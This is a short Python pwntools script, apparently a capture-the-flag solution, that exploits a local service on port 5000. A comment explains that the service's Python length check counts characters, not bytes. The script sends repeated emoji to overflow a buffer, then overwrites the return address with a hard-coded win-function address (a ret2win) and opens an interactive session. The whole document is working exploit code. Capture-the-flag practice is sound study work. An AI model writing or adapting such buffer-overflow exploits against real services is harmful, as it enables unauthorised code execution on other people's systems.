from pwn import *

r = remote('localhost', 5000)
# abuse that python string len counts the number of chars not the byte length
# then just a simple ret2win
r.sendline('😁'.encode()*(0x100//4) + b'\0'*0x18 + p64(0x401267))

r.interactive()